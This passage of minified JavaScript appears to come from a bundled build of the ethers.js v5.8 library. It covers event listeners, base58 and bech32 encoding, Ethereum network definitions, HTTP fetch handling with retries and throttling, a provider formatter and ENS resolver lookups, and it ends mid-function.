this._addEventListener(this._getRunningEvent(e),r,!1),this}once(e,r){return this._addEventListener(this._getRunningEvent(e),r,!0),this}emit(e,...r){if(!this.provider)return!1;const n=this._getRunningEvent(e),i=n.run(r)>0;return this._checkRunningEvents(n),i}listenerCount(e){return this.provider?e==null?Object.keys(this._runningEvents).reduce((r,n)=>r+this._runningEvents[n].listenerCount(),0):this._getRunningEvent(e).listenerCount():0}listeners(e){if(!this.provider)return[];if(e==null){const r=[];for(let n in this._runningEvents)this._runningEvents[n].listeners().forEach(i=>{r.push(i)});return r}return this._getRunningEvent(e).listeners()}removeAllListeners(e){if(!this.provider)return this;if(e==null){for(const n in this._runningEvents){const i=this._runningEvents[n];i.removeAllListeners(),this._checkRunningEvents(i)}return this}const r=this._getRunningEvent(e);return r.removeAllListeners(),this._checkRunningEvents(r),this}off(e,r){if(!this.provider)return this;const n=this._getRunningEvent(e);return n.removeListener(r),this._checkRunningEvents(n),this}removeListener(e,r){return this.off(e,r)}}class Lu extends AQ{}class eS{constructor(e){X(this,"alphabet",e),X(this,"base",e.length),X(this,"_alphabetMap",{}),X(this,"_leader",e.charAt(0));for(let r=0;r<e.length;r++)this._alphabetMap[e.charAt(r)]=r}encode(e){let r=ve(e);if(r.length===0)return"";let n=[0];for(let s=0;s<r.length;++s){let o=r[s];for(let a=0;a<n.length;++a)o+=n[a]<<8,n[a]=o%this.base,o=o/this.base|0;for(;o>0;)n.push(o%this.base),o=o/this.base|0}let i="";for(let s=0;r[s]===0&&s<r.length-1;++s)i+=this._leader;for(let s=n.length-1;s>=0;--s)i+=this.alphabet[n[s]];return i}decode(e){if(typeof e!="string")throw new TypeError("Expected String");let r=[];if(e.length===0)return new Uint8Array(r);r.push(0);for(let n=0;n<e.length;n++){let i=this._alphabetMap[e[n]];if(i===void 0)throw new Error("Non-base"+this.base+" character");let s=i;for(let o=0;o<r.length;++o)s+=r[o]*this.base,r[o]=s&255,s>>=8;for(;s>0;)r.push(s&255),s>>=8}for(let n=0;e[n]===this._leader&&n<e.length-1;++n)r.push(0);return ve(new Uint8Array(r.reverse()))}}new eS("abcdefghijklmnopqrstuvwxyz234567");const F0=new eS("123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz");function c1(t){return"0x"+Pi.sha256().update(ve(t)).digest("hex")}const _Q="networks/5.8.0",u1=new H(_Q);function CQ(t){return t&&typeof t.renetwork=="function"}function ai(t){const e=function(r,n){n==null&&(n={});const i=[];if(r.InfuraProvider&&n.infura!=="-")try{i.push(new r.InfuraProvider(t,n.infura))}catch{}if(r.EtherscanProvider&&n.etherscan!=="-")try{i.push(new r.EtherscanProvider(t,n.etherscan))}catch{}if(r.AlchemyProvider&&n.alchemy!=="-")try{i.push(new r.AlchemyProvider(t,n.alchemy))}catch{}if(r.PocketProvider&&n.pocket!=="-"){const s=["goerli","ropsten","rinkeby","sepolia"];try{const o=new r.PocketProvider(t,n.pocket);o.network&&s.indexOf(o.network.name)===-1&&i.push(o)}catch{}}if(r.CloudflareProvider&&n.cloudflare!=="-")try{i.push(new r.CloudflareProvider(t))}catch{}if(r.AnkrProvider&&n.ankr!=="-")try{const s=["ropsten"],o=new r.AnkrProvider(t,n.ankr);o.network&&s.indexOf(o.network.name)===-1&&i.push(o)}catch{}if(r.QuickNodeProvider&&n.quicknode!=="-")try{i.push(new r.QuickNodeProvider(t,n.quicknode))}catch{}if(i.length===0)return null;if(r.FallbackProvider){let s=1;return n.quorum!=null?s=n.quorum:t==="homestead"&&(s=2),new r.FallbackProvider(i,s)}return i[0]};return e.renetwork=function(r){return ai(r)},e}function yf(t,e){const r=function(n,i){return n.JsonRpcProvider?new n.JsonRpcProvider(t,e):null};return r.renetwork=function(n){return yf(t,n)},r}const l1={chainId:1,ensAddress:"0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e",name:"homestead",_defaultProvider:ai("homestead")},h1={chainId:3,ensAddress:"0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e",name:"ropsten",_defaultProvider:ai("ropsten")},d1={chainId:63,name:"classicMordor",_defaultProvider:yf("https://www.ethercluster.com/mordor","classicMordor")},td={unspecified:{chainId:0,name:"unspecified"},homestead:l1,mainnet:l1,morden:{chainId:2,name:"morden"},ropsten:h1,testnet:h1,rinkeby:{chainId:4,ensAddress:"0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e",name:"rinkeby",_defaultProvider:ai("rinkeby")},kovan:{chainId:42,name:"kovan",_defaultProvider:ai("kovan")},goerli:{chainId:5,ensAddress:"0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e",name:"goerli",_defaultProvider:ai("goerli")},kintsugi:{chainId:1337702,name:"kintsugi"},sepolia:{chainId:11155111,ensAddress:"0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e",name:"sepolia",_defaultProvider:ai("sepolia")},holesky:{chainId:17e3,name:"holesky",_defaultProvider:ai("holesky")},classic:{chainId:61,name:"classic",_defaultProvider:yf("https://www.ethercluster.com/etc","classic")},classicMorden:{chainId:62,name:"classicMorden"},classicMordor:d1,classicTestnet:d1,classicKotti:{chainId:6,name:"classicKotti",_defaultProvider:yf("https://www.ethercluster.com/kotti","classicKotti")},xdai:{chainId:100,name:"xdai"},matic:{chainId:137,name:"matic",_defaultProvider:ai("matic")},maticmum:{chainId:80001,name:"maticmum",_defaultProvider:ai("maticmum")},optimism:{chainId:10,name:"optimism",_defaultProvider:ai("optimism")},"optimism-kovan":{chainId:69,name:"optimism-kovan"},"optimism-goerli":{chainId:420,name:"optimism-goerli"},"optimism-sepolia":{chainId:11155420,name:"optimism-sepolia"},arbitrum:{chainId:42161,name:"arbitrum"},"arbitrum-rinkeby":{chainId:421611,name:"arbitrum-rinkeby"},"arbitrum-goerli":{chainId:421613,name:"arbitrum-goerli"},"arbitrum-sepolia":{chainId:421614,name:"arbitrum-sepolia"},bnb:{chainId:56,name:"bnb"},bnbt:{chainId:97,name:"bnbt"}};function IQ(t){if(t==null)return null;if(typeof t=="number"){for(const n in td){const i=td[n];if(i.chainId===t)return{name:i.name,chainId:i.chainId,ensAddress:i.ensAddress||null,_defaultProvider:i._defaultProvider||null}}return{chainId:t,name:"unknown"}}if(typeof t=="string"){const n=td[t];return n==null?null:{name:n.name,chainId:n.chainId,ensAddress:n.ensAddress,_defaultProvider:n._defaultProvider||null}}const e=td[t.name];if(!e)return typeof t.chainId!="number"&&u1.throwArgumentError("invalid network chainId","network",t),t;t.chainId!==0&&t.chainId!==e.chainId&&u1.throwArgumentError("network chainId mismatch","network",t);let r=t._defaultProvider||null;return r==null&&e._defaultProvider&&(CQ(e._defaultProvider)?r=e._defaultProvider.renetwork(t):r=e._defaultProvider),{name:t.name,chainId:e.chainId,ensAddress:t.ensAddress||e.ensAddress||null,_defaultProvider:r}}const xQ="web/5.8.0";var SQ=function(t,e,r,n){function i(s){return s instanceof r?s:new r(function(o){o(s)})}return new(r||(r=Promise))(function(s,o){function a(l){try{u(n.next(l))}catch(h){o(h)}}function c(l){try{u(n.throw(l))}catch(h){o(h)}}function u(l){l.done?s(l.value):i(l.value).then(a,c)}u((n=n.apply(t,e||[])).next())})};function NQ(t,e){return SQ(this,void 0,void 0,function*(){e==null&&(e={});const r={method:e.method||"GET",headers:e.headers||{},body:e.body||void 0};if(e.skipFetchSetup!==!0&&(r.mode="cors",r.cache="no-cache",r.credentials="same-origin",r.redirect="follow",r.referrer="client"),e.fetchOptions!=null){const o=e.fetchOptions;o.mode&&(r.mode=o.mode),o.cache&&(r.cache=o.cache),o.credentials&&(r.credentials=o.credentials),o.redirect&&(r.redirect=o.redirect),o.referrer&&(r.referrer=o.referrer)}const n=yield fetch(t,r),i=yield n.arrayBuffer(),s={};return n.headers.forEach?n.headers.forEach((o,a)=>{s[a.toLowerCase()]=o}):n.headers.keys().forEach(o=>{s[o.toLowerCase()]=n.headers.get(o)}),{headers:s,statusCode:n.status,statusMessage:n.statusText,body:ve(new Uint8Array(i))}})}var TQ=function(t,e,r,n){function i(s){return s instanceof r?s:new r(function(o){o(s)})}return new(r||(r=Promise))(function(s,o){function a(l){try{u(n.next(l))}catch(h){o(h)}}function c(l){try{u(n.throw(l))}catch(h){o(h)}}function u(l){l.done?s(l.value):i(l.value).then(a,c)}u((n=n.apply(t,e||[])).next())})};const si=new H(xQ);function f1(t){return new Promise(e=>{setTimeout(e,t)})}function $s(t,e){if(t==null)return null;if(typeof t=="string")return t;if(Gy(t)){if(e&&(e.split("/")[0]==="text"||e.split(";")[0].trim()==="application/json"))try{return wh(t)}catch{}return we(t)}return t}function PQ(t){return Gi(t.replace(/%([0-9a-f][0-9a-f])/gi,(e,r)=>String.fromCharCode(parseInt(r,16))))}function RQ(t,e,r){const n=typeof t=="object"&&t.throttleLimit!=null?t.throttleLimit:12;si.assertArgument(n>0&&n%1===0,"invalid connection throttle limit","connection.throttleLimit",n);const i=typeof t=="object"?t.throttleCallback:null,s=typeof t=="object"&&typeof t.throttleSlotInterval=="number"?t.throttleSlotInterval:100;si.assertArgument(s>0&&s%1===0,"invalid connection throttle slot interval","connection.throttleSlotInterval",s);const o=typeof t=="object"?!!t.errorPassThrough:!1,a={};let c=null;const u={method:"GET"};let l=!1,h=2*60*1e3;if(typeof t=="string")c=t;else if(typeof t=="object"){if((t==null||t.url==null)&&si.throwArgumentError("missing URL","connection.url",t),c=t.url,typeof t.timeout=="number"&&t.timeout>0&&(h=t.timeout),t.headers)for(const A in t.headers)a[A.toLowerCase()]={key:A,value:String(t.headers[A])},["if-none-match","if-modified-since"].indexOf(A.toLowerCase())>=0&&(l=!0);if(u.allowGzip=!!t.allowGzip,t.user!=null&&t.password!=null){c.substring(0,6)!=="https:"&&t.allowInsecureAuthentication!==!0&&si.throwError("basic authentication requires a secure https url",H.errors.INVALID_ARGUMENT,{argument:"url",url:c,user:t.user,password:"[REDACTED]"});const A=t.user+":"+t.password;a.authorization={key:"Authorization",value:"Basic "+kx(Gi(A))}}t.skipFetchSetup!=null&&(u.skipFetchSetup=!!t.skipFetchSetup),t.fetchOptions!=null&&(u.fetchOptions=pr(t.fetchOptions))}const d=new RegExp("^data:([^;:]*)?(;base64)?,(.*)$","i"),g=c?c.match(d):null;if(g)try{const A={statusCode:200,statusMessage:"OK",headers:{"content-type":g[1]||"text/plain"},body:g[2]?Ox(g[3]):PQ(g[3])};let _=A.body;return r&&(_=r(A.body,A)),Promise.resolve(_)}catch(A){si.throwError("processing response error",H.errors.SERVER_ERROR,{body:$s(g[1],g[2]),error:A,requestBody:null,requestMethod:"GET",url:c})}e&&(u.method="POST",u.body=e,a["content-type"]==null&&(a["content-type"]={key:"Content-Type",value:"application/octet-stream"}),a["content-length"]==null&&(a["content-length"]={key:"Content-Length",value:String(e.length)}));const y={};Object.keys(a).forEach(A=>{const _=a[A];y[_.key]=_.value}),u.headers=y;const m=function(){let A=null;return{promise:new Promise(function(P,S){h&&(A=setTimeout(()=>{A!=null&&(A=null,S(si.makeError("timeout",H.errors.TIMEOUT,{requestBody:$s(u.body,y["content-type"]),requestMethod:u.method,timeout:h,url:c})))},h))}),cancel:function(){A!=null&&(clearTimeout(A),A=null)}}}(),b=function(){return TQ(this,void 0,void 0,function*(){for(let A=0;A<n;A++){let _=null;try{if(_=yield NQ(c,u),A<n){if(_.statusCode===301||_.statusCode===302){const P=_.headers.location||"";if(u.method==="GET"&&P.match(/^https:/)){c=_.headers.location;continue}}else if(_.statusCode===429){let P=!0;if(i&&(P=yield i(A,c)),P){let S=0;const C=_.headers["retry-after"];typeof C=="string"&&C.match(/^[1-9][0-9]*$/)?S=parseInt(C)*1e3:S=s*parseInt(String(Math.random()*Math.pow(2,A))),yield f1(S);continue}}}}catch(P){_=P.response,_==null&&(m.cancel(),si.throwError("missing response",H.errors.SERVER_ERROR,{requestBody:$s(u.body,y["content-type"]),requestMethod:u.method,serverError:P,url:c}))}let T=_.body;if(l&&_.statusCode===304?T=null:!o&&(_.statusCode<200||_.statusCode>=300)&&(m.cancel(),si.throwError("bad response",H.errors.SERVER_ERROR,{status:_.statusCode,headers:_.headers,body:$s(T,_.headers?_.headers["content-type"]:null),requestBody:$s(u.body,y["content-type"]),requestMethod:u.method,url:c})),r)try{const P=yield r(T,_);return m.cancel(),P}catch(P){if(P.throttleRetry&&A<n){let S=!0;if(i&&(S=yield i(A,c)),S){const C=s*parseInt(String(Math.random()*Math.pow(2,A)));yield f1(C);continue}}m.cancel(),si.throwError("processing response error",H.errors.SERVER_ERROR,{body:$s(T,_.headers?_.headers["content-type"]:null),error:P,requestBody:$s(u.body,y["content-type"]),requestMethod:u.method,url:c})}return m.cancel(),T}return si.throwError("failed response",H.errors.SERVER_ERROR,{requestBody:$s(u.body,y["content-type"]),requestMethod:u.method,url:c})})}();return Promise.race([m.promise,b])}function nw(t,e,r){let n=(s,o)=>{let a=null;if(s!=null)try{a=JSON.parse(wh(s))}catch(c){si.throwError("invalid JSON",H.errors.SERVER_ERROR,{body:s,error:c})}return r&&(a=r(a,o)),a},i=null;if(e!=null){i=Gi(e);const s=typeof t=="string"?{url:t}:pr(t);s.headers?Object.keys(s.headers).filter(a=>a.toLowerCase()==="content-type").length!==0||(s.headers=pr(s.headers),s.headers["content-type"]="application/json"):s.headers={"content-type":"application/json"},t=s}return RQ(t,i,n)}function Iu(t,e){return e||(e={}),e=pr(e),e.floor==null&&(e.floor=0),e.ceiling==null&&(e.ceiling=1e4),e.interval==null&&(e.interval=250),new Promise(function(r,n){let i=null,s=!1;const o=()=>s?!1:(s=!0,i&&clearTimeout(i),!0);e.timeout&&(i=setTimeout(()=>{o()&&n(new Error("timeout"))},e.timeout));const a=e.retryLimit;let c=0;function u(){return t().then(function(l){if(l!==void 0)o()&&r(l);else if(e.oncePoll)e.oncePoll.once("poll",u);else if(e.onceBlock)e.onceBlock.once("block",u);else if(!s){if(c++,c>a){o()&&n(new Error("retry limit reached"));return}let h=e.interval*parseInt(String(Math.random()*Math.pow(2,c)));h<e.floor&&(h=e.floor),h>e.ceiling&&(h=e.ceiling),setTimeout(u,h)}return null},function(l){o()&&n(l)})}u()})}var cm,p1;function OQ(){if(p1)return cm;p1=1;for(var t="qpzry9x8gf2tvdw0s3jn54khce6mua7l",e={},r=0;r<t.length;r++){var n=t.charAt(r);if(e[n]!==void 0)throw new TypeError(n+" is ambiguous");e[n]=r}function i(m){var b=m>>25;return(m&33554431)<<5^-(b>>0&1)&996825010^-(b>>1&1)&642813549^-(b>>2&1)&513874426^-(b>>3&1)&1027748829^-(b>>4&1)&705979059}function s(m){for(var b=1,A=0;A<m.length;++A){var _=m.charCodeAt(A);if(_<33||_>126)return"Invalid prefix ("+m+")";b=i(b)^_>>5}for(b=i(b),A=0;A<m.length;++A){var T=m.charCodeAt(A);b=i(b)^T&31}return b}function o(m,b,A){if(A=A||90,m.length+7+b.length>A)throw new TypeError("Exceeds length limit");m=m.toLowerCase();var _=s(m);if(typeof _=="string")throw new Error(_);for(var T=m+"1",P=0;P<b.length;++P){var S=b[P];if(S>>5!==0)throw new Error("Non 5-bit word");_=i(_)^S,T+=t.charAt(S)}for(P=0;P<6;++P)_=i(_);for(_^=1,P=0;P<6;++P){var C=_>>(5-P)*5&31;T+=t.charAt(C)}return T}function a(m,b){if(b=b||90,m.length<8)return m+" too short";if(m.length>b)return"Exceeds length limit";var A=m.toLowerCase(),_=m.toUpperCase();if(m!==A&&m!==_)return"Mixed-case string "+m;m=A;var T=m.lastIndexOf("1");if(T===-1)return"No separator character for "+m;if(T===0)return"Missing prefix for "+m;var P=m.slice(0,T),S=m.slice(T+1);if(S.length<6)return"Data too short";var C=s(P);if(typeof C=="string")return C;for(var O=[],$=0;$<S.length;++$){var D=S.charAt($),F=e[D];if(F===void 0)return"Unknown character "+D;C=i(C)^F,!($+6>=S.length)&&O.push(F)}return C!==1?"Invalid checksum for "+m:{prefix:P,words:O}}function c(){var m=a.apply(null,arguments);if(typeof m=="object")return m}function u(m){var b=a.apply(null,arguments);if(typeof b=="object")return b;throw new Error(b)}function l(m,b,A,_){for(var T=0,P=0,S=(1<<A)-1,C=[],O=0;O<m.length;++O)for(T=T<<b|m[O],P+=b;P>=A;)P-=A,C.push(T>>P&S);if(_)P>0&&C.push(T<<A-P&S);else{if(P>=b)return"Excess padding";if(T<<A-P&S)return"Non-zero padding"}return C}function h(m){var b=l(m,8,5,!0);if(Array.isArray(b))return b}function d(m){var b=l(m,8,5,!0);if(Array.isArray(b))return b;throw new Error(b)}function g(m){var b=l(m,5,8,!1);if(Array.isArray(b))return b}function y(m){var b=l(m,5,8,!1);if(Array.isArray(b))return b;throw new Error(b)}return cm={decodeUnsafe:c,decode:u,encode:o,toWordsUnsafe:h,toWords:d,fromWordsUnsafe:g,fromWords:y},cm}var kQ=OQ();const g1=co(kQ),ap="providers/5.8.0",mu=new H(ap);class ge{constructor(){this.formats=this.getDefaultFormats()}getDefaultFormats(){const e={},r=this.address.bind(this),n=this.bigNumber.bind(this),i=this.blockTag.bind(this),s=this.data.bind(this),o=this.hash.bind(this),a=this.hex.bind(this),c=this.number.bind(this),u=this.type.bind(this),l=h=>this.data(h,!0);return e.transaction={hash:o,type:u,accessList:ge.allowNull(this.accessList.bind(this),null),blockHash:ge.allowNull(o,null),blockNumber:ge.allowNull(c,null),transactionIndex:ge.allowNull(c,null),confirmations:ge.allowNull(c,null),from:r,gasPrice:ge.allowNull(n),maxPriorityFeePerGas:ge.allowNull(n),maxFeePerGas:ge.allowNull(n),gasLimit:n,to:ge.allowNull(r,null),value:n,nonce:c,data:s,r:ge.allowNull(this.uint256),s:ge.allowNull(this.uint256),v:ge.allowNull(c),creates:ge.allowNull(r,null),raw:ge.allowNull(s)},e.transactionRequest={from:ge.allowNull(r),nonce:ge.allowNull(c),gasLimit:ge.allowNull(n),gasPrice:ge.allowNull(n),maxPriorityFeePerGas:ge.allowNull(n),maxFeePerGas:ge.allowNull(n),to:ge.allowNull(r),value:ge.allowNull(n),data:ge.allowNull(l),type:ge.allowNull(c),accessList:ge.allowNull(this.accessList.bind(this),null)},e.receiptLog={transactionIndex:c,blockNumber:c,transactionHash:o,address:r,topics:ge.arrayOf(o),data:s,logIndex:c,blockHash:o},e.receipt={to:ge.allowNull(this.address,null),from:ge.allowNull(this.address,null),contractAddress:ge.allowNull(r,null),transactionIndex:c,root:ge.allowNull(a),gasUsed:n,logsBloom:ge.allowNull(s),blockHash:o,transactionHash:o,logs:ge.arrayOf(this.receiptLog.bind(this)),blockNumber:c,confirmations:ge.allowNull(c,null),cumulativeGasUsed:n,effectiveGasPrice:ge.allowNull(n),status:ge.allowNull(c),type:u},e.block={hash:ge.allowNull(o),parentHash:o,number:c,timestamp:c,nonce:ge.allowNull(a),difficulty:this.difficulty.bind(this),gasLimit:n,gasUsed:n,miner:ge.allowNull(r),extraData:s,transactions:ge.allowNull(ge.arrayOf(o)),baseFeePerGas:ge.allowNull(n)},e.blockWithTransactions=pr(e.block),e.blockWithTransactions.transactions=ge.allowNull(ge.arrayOf(this.transactionResponse.bind(this))),e.filter={fromBlock:ge.allowNull(i,void 0),toBlock:ge.allowNull(i,void 0),blockHash:ge.allowNull(o,void 0),address:ge.allowNull(r,void 0),topics:ge.allowNull(this.topics.bind(this),void 0)},e.filterLog={blockNumber:ge.allowNull(c),blockHash:ge.allowNull(o),transactionIndex:c,removed:ge.allowNull(this.boolean.bind(this)),address:r,data:ge.allowFalsish(s,"0x"),topics:ge.arrayOf(o),transactionHash:o,logIndex:c},e}accessList(e){return Kc(e||[])}number(e){return e==="0x"?0:ne.from(e).toNumber()}type(e){return e==="0x"||e==null?0:ne.from(e).toNumber()}bigNumber(e){return ne.from(e)}boolean(e){if(typeof e=="boolean")return e;if(typeof e=="string"){if(e=e.toLowerCase(),e==="true")return!0;if(e==="false")return!1}throw new Error("invalid boolean - "+e)}hex(e,r){return typeof e=="string"&&(!r&&e.substring(0,2)!=="0x"&&(e="0x"+e),Ye(e))?e.toLowerCase():mu.throwArgumentError("invalid hash","value",e)}data(e,r){const n=this.hex(e,r);if(n.length%2!==0)throw new Error("invalid data; odd-length - "+e);return n}address(e){return Mr(e)}callAddress(e){if(!Ye(e,32))return null;const r=Mr(qr(e,12));return r===BV?null:r}contractAddress(e){return Ax(e)}blockTag(e){if(e==null)return"latest";if(e==="earliest")return"0x0";switch(e){case"earliest":return"0x0";case"latest":case"pending":case"safe":case"finalized":return e}if(typeof e=="number"||Ye(e))return Vy(e);throw new Error("invalid blockTag")}hash(e,r){const n=this.hex(e,r);return fa(n)!==32?mu.throwArgumentError("invalid hash","value",e):n}difficulty(e){if(e==null)return null;const r=ne.from(e);try{return r.toNumber()}catch{}return null}uint256(e){if(!Ye(e))throw new Error("invalid uint256");return Vt(e,32)}_block(e,r){e.author!=null&&e.miner==null&&(e.miner=e.author);const n=e._difficulty!=null?e._difficulty:e.difficulty,i=ge.check(r,e);return i._difficulty=n==null?null:ne.from(n),i}block(e){return this._block(e,this.formats.block)}blockWithTransactions(e){return this._block(e,this.formats.blockWithTransactions)}transactionRequest(e){return ge.check(this.formats.transactionRequest,e)}transactionResponse(e){e.gas!=null&&e.gasLimit==null&&(e.gasLimit=e.gas),e.to&&ne.from(e.to).isZero()&&(e.to="0x0000000000000000000000000000000000000000"),e.input!=null&&e.data==null&&(e.data=e.input),e.to==null&&e.creates==null&&(e.creates=this.contractAddress(e)),(e.type===1||e.type===2)&&e.accessList==null&&(e.accessList=[]);const r=ge.check(this.formats.transaction,e);if(e.chainId!=null){let n=e.chainId;Ye(n)&&(n=ne.from(n).toNumber()),r.chainId=n}else{let n=e.networkId;n==null&&r.v==null&&(n=e.chainId),Ye(n)&&(n=ne.from(n).toNumber()),typeof n!="number"&&r.v!=null&&(n=(r.v-35)/2,n<0&&(n=0),n=parseInt(n)),typeof n!="number"&&(n=0),r.chainId=n}return r.blockHash&&r.blockHash.replace(/0/g,"")==="x"&&(r.blockHash=null),r}transaction(e){return gQ(e)}receiptLog(e){return ge.check(this.formats.receiptLog,e)}receipt(e){const r=ge.check(this.formats.receipt,e);if(r.root!=null)if(r.root.length<=4){const n=ne.from(r.root).toNumber();n===0||n===1?(r.status!=null&&r.status!==n&&mu.throwArgumentError("alt-root-status/status mismatch","value",{root:r.root,status:r.status}),r.status=n,delete r.root):mu.throwArgumentError("invalid alt-root-status","value.root",r.root)}else r.root.length!==66&&mu.throwArgumentError("invalid root hash","value.root",r.root);return r.status!=null&&(r.byzantium=!0),r}topics(e){return Array.isArray(e)?e.map(r=>this.topics(r)):e!=null?this.hash(e,!0):null}filter(e){return ge.check(this.formats.filter,e)}filterLog(e){return ge.check(this.formats.filterLog,e)}static check(e,r){const n={};for(const i in e)try{const s=e[i](r[i]);s!==void 0&&(n[i]=s)}catch(s){throw s.checkKey=i,s.checkValue=r[i],s}return n}static allowNull(e,r){return function(n){return n==null?r:e(n)}}static allowFalsish(e,r){return function(n){return n?e(n):r}}static arrayOf(e){return function(r){if(!Array.isArray(r))throw new Error("not an array");const n=[];return r.forEach(function(i){n.push(e(i))}),n}}}var Se=function(t,e,r,n){function i(s){return s instanceof r?s:new r(function(o){o(s)})}return new(r||(r=Promise))(function(s,o){function a(l){try{u(n.next(l))}catch(h){o(h)}}function c(l){try{u(n.throw(l))}catch(h){o(h)}}function u(l){l.done?s(l.value):i(l.value).then(a,c)}u((n=n.apply(t,e||[])).next())})};const Be=new H(ap),DQ=10;function m1(t){return t==null?"null":(fa(t)!==32&&Be.throwArgumentError("invalid topic","topic",t),t.toLowerCase())}function y1(t){for(t=t.slice();t.length>0&&t[t.length-1]==null;)t.pop();return t.map(e=>{if(Array.isArray(e)){const r={};e.forEach(i=>{r[m1(i)]=!0});const n=Object.keys(r);return n.sort(),n.join("|")}else return m1(e)}).join("&")}function MQ(t){return t===""?[]:t.split(/&/g).map(e=>{if(e==="")return[];const r=e.split("|").map(n=>n==="null"?null:n);return r.length===1?r[0]:r})}function Ga(t){if(typeof t=="string"){if(t=t.toLowerCase(),fa(t)===32)return"tx:"+t;if(t.indexOf(":")===-1)return t}else{if(Array.isArray(t))return"filter:*:"+y1(t);if(BK.isForkEvent(t))throw Be.warn("not implemented"),new Error("not implemented");if(t&&typeof t=="object")return"filter:"+(t.address||"*")+":"+y1(t.topics||[])}throw new Error("invalid event - "+t)}function yu(){return new Date().getTime()}function w1(t){return new Promise(e=>{setTimeout(e,t)})}const BQ=["block","network","pending","poll"];let UQ=class{constructor(e,r,n){X(this,"tag",e),X(this,"listener",r),X(this,"once",n),this._lastBlockNumber=-2,this._inflight=!1}get event(){switch(this.type){case"tx":return this.hash;case"filter":return this.filter}return this.tag}get type(){return this.tag.split(":")[0]}get hash(){const e=this.tag.split(":");return e[0]!=="tx"?null:e[1]}get filter(){const e=this.tag.split(":");if(e[0]!=="filter")return null;const r=e[1],n=MQ(e[2]),i={};return n.length>0&&(i.topics=n),r&&r!=="*"&&(i.address=r),i}pollable(){return this.tag.indexOf(":")>=0||BQ.indexOf(this.tag)>=0}};const $Q={0:{symbol:"btc",p2pkh:0,p2sh:5,prefix:"bc"},2:{symbol:"ltc",p2pkh:48,p2sh:50,prefix:"ltc"},3:{symbol:"doge",p2pkh:30,p2sh:22},60:{symbol:"eth",ilk:"eth"},61:{symbol:"etc",ilk:"eth"},700:{symbol:"xdai",ilk:"eth"}};function um(t){return Vt(ne.from(t).toHexString(),32)}function b1(t){return F0.encode(Pn([t,qr(c1(c1(t)),0,4)]))}const tS=new RegExp("^(ipfs)://(.*)$","i"),v1=[new RegExp("^(https)://(.*)$","i"),new RegExp("^(data):(.*)$","i"),tS,new RegExp("^eip155:[0-9]+/(erc[0-9]+):(.*)$","i")];function Id(t,e){try{return wh(Hl(t,e))}catch{}return null}function Hl(t,e){if(t==="0x")return null;const r=ne.from(qr(t,e,e+32)).toNumber(),n=ne.from(qr(t,r,r+32)).toNumber();return qr(t,r+32,r+32+n)}function lm(t){return t.match(/^ipfs:\/\/ipfs\//i)?t=t.substring(12):t.match(/^ipfs:\/\//i)?t=t.substring(7):Be.throwArgumentError("unsupported IPFS format","link",t),`https://gateway.ipfs.io/ipfs/${t}`}function E1(t){const e=ve(t);if(e.length>32)throw new Error("internal; should not happen");const r=new Uint8Array(32);return r.set(e,32-e.length),r}function LQ(t){if(t.length%32===0)return t;const e=new Uint8Array(Math.ceil(t.length/32)*32);return e.set(t),e}function rS(t){const e=[];let r=0;for(let n=0;n<t.length;n++)e.push(null),r+=32;for(let n=0;n<t.length;n++){const i=ve(t[n]);e[n]=E1(r),e.push(E1(i.length)),e.push(LQ(i)),r+=32+Math.ceil(i.length/32)*32}return dn(e)}class A1{constructor(e,r,n,i){X(this,"provider",e),X(this,"name",n),X(this,"address",e.formatter.address(r)),X(this,"_resolvedAddress",i)}supportsWildcard(){return this._supportsEip2544||(this._supportsEip2544=this.provider.call({to:this.address,data:"0x01ffc9a79061b92300000000000000000000000000000000000000000000000000000000"}).then(e=>ne.from(e).eq(1)).catch(e=>{if(e.code===H.errors.CALL_EXCEPTION)return!1;throw this._supportsEip2544=null,e})),this._supportsEip2544}_fetch(e,r){return Se(this,void 0,void 0,function*(){const n={to:this.address,ccipReadEnabled:!0,data:dn([e,Ed(this.name),r||"0x"])};let i=!1;(yield this.supportsWildcard())&&(i=!0,n.data=dn(["0x9061b923",rS([EK(this.name),n.data])]));try{let s=yield this.provider.call(n);return ve(s).length%32===4&&Be.throwError("resolver threw error",H.errors.CALL_EXCEPTION,{transaction:n,data:s}),i&&(s=Hl(s,0)),s}catch(s){if(s.code===H.errors.CALL_EXCEPTION)return null;throw s}})}_fetchBytes(e,r){return Se(this,void 0,void 0,function*(){const n=yield this._fetch(e,r);return n!=null?Hl(n,0):null})}_getAddress(e,r){const n=$Q[String(e)];if(n==null&&Be.throwError(`unsupported coin type: ${e}`,H.errors.UNSUPPORTED_OPERATION,{operation:`getAddress(${e})`}),n.ilk==="eth")return this.provider.formatter.address(r);const i=ve(r);if(n.p2pkh!=null){const s=r.match(/^0x76a9([0-9a-f][0-9a-f])([0-9a-f]*)88ac$/);if(s){const o=parseInt(s[1],16);if(s[2].length===o*2&&o>=1&&o<=75)return b1(Pn([[n.p2pkh],"0x"+s[2]]))}}if(n.p2sh!=null){const s=r.match(/^0xa9([0-9a-f][0-9a-f])([0-9a-f]*)87$/);if(s){const o=parseInt(s[1],16);if(s[2].length===o*2&&o>=1&&o<=75)return b1(Pn([[n.p2sh],"0x"+s[2]]))}}if(n.prefix!=null){const s=i[1];let o=i[0];if(o===0?s!==20&&s!==32&&(o=-1):o=-1,o>=0&&i.length===2+s&&s>=1&&s<=75){const a=g1.toWords(i.slice(2));return a.unshift(o),g1.encode(n.prefix,a)}}return null}getAddress(e){return Se(this,void 0,void 0,function*(){if(e==null&&(e=60),e===60)try{const i=yield this._fetch("0x3b3b57de");return i==="0x"||i===LV?null:this.provider.formatter.callAddress(i)}catch(i){if(i.code===H.errors.CALL_EXCEPTION)return null;throw i}const r=yield this._fetchBytes("0xf1cb7e06",um(e));if(r==null||r==="0x")return null;const n=this._getAddress(e,r);return n==null&&Be.throwError("invalid or unsupported coin data",H.errors.UNSUPPORTED_OPERATION,{operation:`getAddress(${e})`,coinType:e,data:r}),n})}getAvatar(){return Se(this,void 0,void 0,function*(){const e=[{type:"name",content:this.name}];try{const r=yield this.getText("avatar");if(r==null)return null;for(let n=0;n<v1.length;n++){const i=r.match(v1[n]);if(i==null)continue;const s=i[1].toLowerCase();switch(s){case"https":return e.push({type:"url",content:r}),{linkage:e,url:r};case"data":return e.push({type:"data",content:r}),{linkage:e,url:r};case"ipfs":return e.push({type:"ipfs",content:r}),{linkage:e,url:lm(r)};case"erc721":case"erc1155":{const 